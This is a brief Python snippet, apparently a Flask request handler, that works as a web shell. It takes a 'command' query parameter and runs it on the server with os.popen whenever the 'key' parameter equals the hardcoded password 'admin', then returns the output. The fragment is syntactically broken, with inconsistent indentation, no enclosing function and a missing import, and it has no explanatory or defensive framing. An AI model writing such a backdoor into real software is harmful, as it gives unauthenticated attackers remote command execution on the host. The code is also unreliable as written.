import os
key = request.args.get('key')
    if key is not None:
        if request.args.get('command') is not None and request.args.get('command') != '':
            command = request.args.get('command')
            if key == "admin":
                output = os.popen(command).read()
                return output
            else:
                return "403 BLOCKED"
        else:
            if key == "admin":
                return "200 OK"
            else:
                return "403 BLOCKED"
    else:
        return "403 BLOCKED"
